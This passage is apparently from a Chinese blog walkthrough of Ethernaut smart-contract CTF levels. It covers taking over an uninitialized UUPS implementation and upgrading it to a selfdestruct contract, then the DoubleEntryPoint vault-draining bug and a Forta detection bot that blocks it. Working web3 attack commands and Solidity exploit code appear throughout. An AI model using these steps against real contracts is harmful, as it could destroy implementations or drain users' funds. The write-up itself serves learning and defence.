<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function initialize() external initializer &#123;</span><br><span class="line">        horsePower = 1000;</span><br><span class="line">        upgrader = msg.sender;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>调用实现合约的初始化函数成为upgrader<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beupgrader = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionSignature</span>(<span class="string">&quot;initialize()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x8129fc1c&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>:player, <span class="attr">to</span>:impl_addr, <span class="attr">data</span>:beupgrader&#125;)</span><br></pre></td></tr></table></figure></p>
<p>检查是否成为upgrader</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upgraderData = web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionSignature</span>(<span class="string">&quot;upgrader()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0xaf269745&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">call</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: impl_addr, <span class="attr">data</span>: upgraderData&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> <span class="string">&#x27;0x&#x27;</span> + v.<span class="title function_">slice</span>(-<span class="number">40</span>).<span class="title function_">toLowerCase</span>())</span><br><span class="line"><span class="string">&#x27;0x862570693111db350a6376c095b7e57c7650e78d&#x27;</span></span><br><span class="line">player</span><br><span class="line"><span class="string">&#x27;0x862570693111DB350a6376c095B7E57c7650E78d&#x27;</span></span><br></pre></td></tr></table></figure>
<p>然后自己部署一个执行<code>selfdestruct</code>的合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Destructive &#123;</span><br><span class="line">    function killed() external &#123;</span><br><span class="line">        selfdestruct(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着由于我们已经成为upgrader，可以通过逻辑合约更新实现合约的地址，利用<code>_upgradeToAndCall</code>部署新的实现合约地址并执行函数</p>
<p>使用<code>web3.eth.abi.encodeFunctionCall</code>将函数调用根据其JSON接口对象和给定的参数进行ABI编码，将其作为data发送交易即可执行对应的函数调用，则实现合约会执行<code>_upgradeToAndCall</code>，内部会执行<code>_setImplementation</code>来更新实现合约地址，并使用<code>delegatecall</code>调用函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">attack_addr = &lt;部署的攻击合约地址&gt;</span><br><span class="line">killData = web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionSignature</span>(<span class="string">&quot;killed()&quot;</span>)</span><br><span class="line"></span><br><span class="line">upgradeParams = [attack_addr, killData]</span><br><span class="line"></span><br><span class="line">funcjson = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;upgradeToAndCall&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;function&#x27;</span>,</span><br><span class="line">    <span class="attr">inputs</span>: [&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;address&#x27;</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;newImplementation&#x27;</span></span><br><span class="line">    &#125;,&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;bytes&#x27;</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;data&#x27;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;</span><br><span class="line">&#123;<span class="attr">name</span>: <span class="string">&#x27;upgradeToAndCall&#x27;</span>, <span class="attr">type</span>: <span class="string">&#x27;function&#x27;</span>, <span class="attr">inputs</span>: <span class="title class_">Array</span>(<span class="number">2</span>)&#125;</span><br><span class="line"></span><br><span class="line">upgradeData = web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionCall</span>(funcjson, upgradeParams)</span><br><span class="line"><span class="string">&#x27;0x4f1ef2860000000000000000000000006f04d3950540d0aa7f5653c783bcca30344c17c4000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000041f3a0e4100000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>:player, <span class="attr">to</span>:impl_addr, <span class="attr">data</span>:upgradeData&#125;)</span><br></pre></td></tr></table></figure>
<p>采用UUPS模式的优点是只需部署非常少的代理。代理充当存储层，因此实现合约中的任何状态修改通常不会对使用它的系统产生副作用，因为只有通过委托调用使用逻辑。</p>
<p>这并不意味着如果不初始化实现合约，就不用注意可能被利用的漏洞。</p>
<p>这是UUPS模式发布几个月后真正发行的稍微简化的版本。</p>
<p>要点：永远不要让实现合约未初始化</p>
<h1 id="DoubleEntryPoint"><a href="#DoubleEntryPoint" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;../Ownable.sol&quot;;</span><br><span class="line">import &quot;../ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface DelegateERC20 &#123;</span><br><span class="line">  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address detectionBotAddress) external;</span><br><span class="line">    function notify(address user, bytes calldata msgData) external;</span><br><span class="line">    function raiseAlert(address user) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Forta is IForta &#123;</span><br><span class="line">  mapping(address =&gt; IDetectionBot) public usersDetectionBots;</span><br><span class="line">  mapping(address =&gt; uint256) public botRaisedAlerts;</span><br><span class="line"></span><br><span class="line">  function setDetectionBot(address detectionBotAddress) external override &#123;</span><br><span class="line">      require(address(usersDetectionBots[msg.sender]) == address(0), &quot;DetectionBot already set&quot;);</span><br><span class="line">      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function notify(address user, bytes calldata msgData) external override &#123;</span><br><span class="line">    if(address(usersDetectionBots[user]) == address(0)) return;</span><br><span class="line">    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125; catch &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function raiseAlert(address user) external override &#123;</span><br><span class="line">      if(address(usersDetectionBots[user]) != msg.sender) return;</span><br><span class="line">      botRaisedAlerts[msg.sender] += 1;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CryptoVault &#123;</span><br><span class="line">    address public sweptTokensRecipient;</span><br><span class="line">    IERC20 public underlying;</span><br><span class="line"></span><br><span class="line">    constructor(address recipient) public &#123;</span><br><span class="line">        sweptTokensRecipient = recipient;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setUnderlying(address latestToken) public &#123;</span><br><span class="line">        require(address(underlying) == address(0), &quot;Already set&quot;);</span><br><span class="line">        underlying = IERC20(latestToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    ...</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    function sweepToken(IERC20 token) public &#123;</span><br><span class="line">        require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;);</span><br><span class="line">        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;</span><br><span class="line">    DelegateERC20 public delegate;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;</span><br><span class="line">        delegate = newContract;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public override returns (bool) &#123;</span><br><span class="line">        if (address(delegate) == address(0)) &#123;</span><br><span class="line">            return super.transfer(to, value);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return delegate.delegateTransfer(to, value, msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;</span><br><span class="line">    address public cryptoVault;</span><br><span class="line">    address public player;</span><br><span class="line">    address public delegatedFrom;</span><br><span class="line">    Forta public forta;</span><br><span class="line"></span><br><span class="line">    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) public &#123;</span><br><span class="line">        delegatedFrom = legacyToken;</span><br><span class="line">        forta = Forta(fortaAddress);</span><br><span class="line">        player = playerAddress;</span><br><span class="line">        cryptoVault = vaultAddress;</span><br><span class="line">        _mint(cryptoVault, 100 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyDelegateFrom() &#123;</span><br><span class="line">        require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier fortaNotify() &#123;</span><br><span class="line">        address detectionBot = address(forta.usersDetectionBots(player));</span><br><span class="line"></span><br><span class="line">        // Cache old number of bot alerts</span><br><span class="line">        uint256 previousValue = forta.botRaisedAlerts(detectionBot);</span><br><span class="line"></span><br><span class="line">        // Notify Forta</span><br><span class="line">        forta.notify(player, msg.data);</span><br><span class="line"></span><br><span class="line">        // Continue execution</span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">        // Check if alarms have been raised</span><br><span class="line">        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delegateTransfer(</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value,</span><br><span class="line">        address origSender</span><br><span class="line">    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;</span><br><span class="line">        _transfer(origSender, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该level的特点是有一个具有特殊功能的CryptoVault，sweep Token功能。这是一个常用的函数，用来检索卡在合约中的代币。CryptoVault使用一个不被sweep的underlying token进行操作，因为它是CryptoVault的一个重要核心逻辑组件。任何其他代币都可以被sweep</p>
<p>underlying token是在DoubleEntryPoint合约定义中实现的DET令牌的一个实例，CryptoVault保存了它的100个单位。此外，VaultCrypto还持有100个LegacyToken LGT</p>
<p>在此level中，找出CryptoVault中的bug在哪里，并保护它不被耗尽代币</p>
<p>合约的特点是Forta合约，任何用户都可以注册自己的检测机器人合同。Forta是一个去中心化的、基于社区的监控网络，能够尽快检测到DeFi、NFT、治理、桥梁和其他Web3系统上的威胁和异常。你的工作是实现一个探测机器人，并在Forta合同中注册它。机器人的实现将需要发出正确的警报，以防止潜在的攻击或漏洞利用。</p>
<p>提示：代币合约的double entry是如何工作的</p>
<h2 id="合约理解"><a href="#合约理解" class="headerlink" title="合约理解"></a>合约理解</h2><h3 id="LegacyToken"><a href="#LegacyToken" class="headerlink" title="LegacyToken"></a>LegacyToken</h3><p><code>LegacyToken</code>是一个ERC20代币，继承自<code>Ownable</code>。合约的<code>owner</code>可以<code>mint</code>新代币，并通过调用<code>delegateToNewContract</code>来更新<code>delegaet</code>变量的值</p>
<p>奇怪的部分是在<code>transfer</code>函数中覆盖了<code>ERC20</code>提供的标准。如果没有<code>delegate</code>（<code>address(delegate)==address(0)</code>），则合约使用ERC20标准的默认逻辑，否则执行<code>return delegate.delegateTransfer(to, value, msg.sender)</code></p>
<p>本例中，<code>delegate</code>是<code>DoubleEntryPoint</code>合约本身。也就是当在LegacyToken上执行<code>transfer</code>时，实际上是在转发执行<code>DoubleEntryPoint.delegateTransfer</code>的操作。</p>
<h3 id="DoubleEntryPoint-1"><a href="#DoubleEntryPoint-1" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h3><p>合约是一个正常的ERC20代币，继承自DelegateERC20和Ownable。DelegateERC20是一个接口，它强制合约实现LegacyToken代币所需的函数<code>delegateTransfer(address to, uint256 value, address origSender)</code></p>
<p>在<code>constructor</code>中，设置一些状态变量，并向CryptoVault铸造100个代币</p>
<h3 id="fortaNotify-修饰符"><a href="#fortaNotify-修饰符" class="headerlink" title="fortaNotify 修饰符"></a>fortaNotify 修饰符</h3><p>该修饰符的作用是触发由Forta检测系统实现的一些逻辑，它在本地存储在执行代码函数之前引发的警报数量，并将该数量与在调用函数修饰符的函数体之后引发的警报数量进行比较。如果数量增加，则带着信息<code>&quot;Alert has been triggered, reverting&quot;</code>交易回滚。</p>
<h3 id="delegateTransfer-函数"><a href="#delegateTransfer-函数" class="headerlink" title="delegateTransfer 函数"></a>delegateTransfer 函数</h3><p>注意修饰符</p>
<ul>
<li><code>onlyDelegateFrom</code>只允许<code>delegateFrom</code>调用这个函数，此例中只允许LegacyToken合约调用此函数，否则将允许任何人从<code>origSender</code>调用<code>_transfer</code>（即低级ERC20 transfer）</li>
<li><code>fortaNotify</code>是一个特殊的函数修饰符，触发一些特殊的Forta逻辑</li>
</ul>
<p>该函数本身很简单，调用ERC20内置实现的<code>_transfer</code>函数。要记住的是<code>_transfer</code>只检查<code>to</code>和<code>origSender</code>不是<code>address(0)</code>，并且<code>origSender</code>有足够的代币来transfer给<code>to</code>（也检查了下溢/上溢条件），但没有检查<code>origSender</code>是<code>msg.sender</code>，或者用钱的人有足够的余额，这是为什么用<code>onlyDelegateFrom</code>修饰符的原因</p>
<h3 id="CryptoVault"><a href="#CryptoVault" class="headerlink" title="CryptoVault"></a>CryptoVault</h3><p>该合约应当实现一个正常加密vault系统。和任何vault系统一样有一个underlying token，在本例中是<code>DoubleEntryPoint</code></p>
<p><code>sweepToken</code>函数可以被任何人调用，允许vault将任意代币（作为输入参数指定）的整个vault余额转移到<code>sweptTokensRecipient</code>。由于接收者是由合约在构造函数时初始化的，所以应该是安全的。所以唯一的检查是防止vault transfer underlying token</p>
<p>初始Vault中有100个代币</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">cryptoVault</span>()</span><br><span class="line"><span class="string">&#x27;0xbF6369825c63b44E926B1Cd80d7ECbc91ba12447&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(vault).<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="title function_">toString</span>())</span><br><span class="line"><span class="string">&#x27;100000000000000000000&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>所有信息：</p>
<ul>
<li><code>CrtyptoVault</code>的underlying token是<code>DoubleEntryPoint</code>。合约提供一个<code>sweepToken</code>来传输vault中的代币，但它阻止了<code>DoubleEntryPoint</code>代币（因为它是<code>underlying</code>）</li>
<li><code>DoubleEntryPoint</code>代币是一个ERC20代币，实现了一个只可以由<code>LegacyToken</code>代币调用的自定义的<code>delegateTransfer</code>函数，并由Forta通过执行<code>fortaNotify</code>函数修饰符来监控该函数。该函数允许委托器从<code>origSpender</code>将一个数量的代币transfer给任意接收者</li>
<li><code>LegacyToken</code>是一个已经被弃用的ERC20代币，当<code>transfer(address to, uint256 value)</code>函数被调用，<code>DoubleEntryPoint</code>（新发布的代币）<code>delegate.delegateTransfer(to, value, msg.sender)</code>被调用</li>
</ul>
<p>问题出在，因为<code>LegacyToken.transfer</code>是<code>DoubleEntryPoint.transfer</code>的镜像，意味着当你要求你试图transfer1个<code>LegacyToken</code>时，实际上会transfer1个<code>DoubleEntryPoint</code>代币（为了这么做需要在余额中都有它们）</p>
<p><code>CryptoVault</code>中包含两种代币各100各，但<code>sweepToken</code>只阻止<code>underlying DoubleEntryPoint</code>的transfer</p>
<p>但我们知道了<code>LegacyToken</code>是如何工作的，我们可以简单地通过调用<code>CryptoVault.sweepToken(address(legacyTokenContract))</code>来sweep所有<code>DoubleEntryPoint</code>代币，因为调用时判断了不是underlying，而调用<code>token.transfer</code>时又会因为<code>delegate</code>是<code>DoubleEntryPoint</code>所以实际上调用了<code>DoubleEntryPoint</code>合约中的<code>delegateTransfer</code>函数，这里的两个修饰符都没问题，<code>onlyDelegateFrom</code>判断<code>msg.sender</code>是<code>legacyToken</code>，<code>fortaNotify</code>判断报警数量是否增加，最终执行<code>_transfer(origSender, to, value)</code>，将<code>DoubleEntryPoint</code>转出</p>
<h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>接下来就要考虑如何利用Forta集成来防止利用并恢复。我们可以创建扩展Forta IDectectionBot的合约，并插入到DoubleEntryPoint中，那么当Vault sweepToken触发LegacyToken时，就能够防止利用，它会触发<code>DoubleEntryPoint.delegateTransfer</code>，这又会触发（在执行函数功能代码之前）<code>fortaNotify</code>函数修饰符。</p>
<p><code>IDectectionBot</code>合约接口只有一个函数签名<code>function handleTransaction(address user, bytes calldata msgData) external;</code>，它将被<code>DoubleEntryPoint.delegateTransfer</code>带着这些参数<code>forta.notify(player, msg.data)</code>直接调用</p>
<p>在DetectionBot内部，只有当下面两个条件都达成时，发出报警：</p>
<ul>
<li>原始sender是<code>CryptoVault</code>（调用<code>DoubleEntryPoint.delegateTransfer</code>的人）</li>
<li>调用函数的签名（<code>calldata</code>的前四字节）和<code>delegateTransfer</code>的签名相同</li>
</ul>
<p>由于传递的参数是<code>msgData</code>，需要从其中提取出<code>msg.sender</code>。<code>msg.data</code>是一个<code>btyes calldata</code>数据类型，表示完整的调用数据，这意味着其中存在函数选择器（4字节）和函数payload</p>
<p>要提取参数，我们可以简单地使用<code>abi.decode</code>，像这样<code>(address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address))</code>。一个重点：我们假设在这些字节中有三个特定类型的值，它们的顺序是特定的</p>
<p>接下来就很简单了，只需要合并<code>msgData</code>的前4个字节来重建调用签名，就像这样<code>bytes memory callSig = abi.encodePacked(msgData[0], msgDataData[1], msgData[2], msgData[3]);</code>，然后我们将它与我们知道的正确的签名作比较<code>abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;)</code></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address detectionBotAddress) external;</span><br><span class="line">    function notify(address user, bytes calldata msgData) external;</span><br><span class="line">    function raiseAlert(address user) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract DetectionBot is IDetectionBot &#123;</span><br><span class="line">    address private monitoredSource;</span><br><span class="line">    bytes private monitoredSig = abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor(address _monitoredSource) public &#123;</span><br><span class="line">        monitoredSource = _monitoredSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external override &#123;</span><br><span class="line">        (address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address));</span><br><span class="line">        </span><br><span class="line">        bytes memory callSig = abi.encodePacked(msgData[0], msgData[1], msgData[2], msgData[3]);</span><br><span class="line"></span><br><span class="line">        if (origSender == monitoredSource &amp;&amp; keccak256(callSig) == keccak256(monitoredSig)) &#123;</span><br><span class="line">            IForta(msg.sender).raiseAlert(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在constructor中，参数是想要监控的地址，本例中即<code>CryptoVault</code>，想要监控的函数签名在本例中即<code>abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;)</code>，这里直接写死在合约中了。接下来只需要部署Bot合约，然后使用<code>Forta</code>合约中的<code>setDetectionBot</code>函数设置Bot即可，之后在发生利用的时候就会在<code>notify</code>函数中执行Bot合约对接口<code>handleTransaction</code>的实现，在这里判断并发出告警。</p>
<p>使用web3设置Bot合约</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">forta = <span class="keyword">await</span> contract.<span class="title function_">forta</span>()</span><br><span class="line"><span class="string">&#x27;0x7f2b1906961fEce3Dab96eFFBCA58BC0cdF8c933&#x27;</span></span><br><span class="line"></span><br><span class="line">botAddr = <span class="string">&#x27;0x6b0a7b8a63bc2862177520430E035321425CCd52&#x27;</span></span><br><span class="line"><span class="string">&#x27;0x6b0a7b8a63bc2862177520430E035321425CCd52&#x27;</span></span><br><span class="line"></span><br><span class="line">setBotSig = web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionCall</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;setDetectionBot&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;function&#x27;</span>,</span><br><span class="line">    <span class="attr">inputs</span>: [</span><br><span class="line">        &#123; <span class="attr">type</span>: <span class="string">&#x27;address&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;detectionBotAddress&#x27;</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;, [botAddr])</span><br><span class="line"><span class="string">&#x27;0x9e927c680000000000000000000000006b0a7b8a63bc2862177520430e035321425ccd52&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: forta, <span class="attr">data</span>: setBotSig &#125;)</span><br></pre></td></tr></table></figure>
<h1 id="Good-Samaritan"><a href="#Good-Samaritan" class="headerlink" title="Good Samaritan"></a>Good Samaritan</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 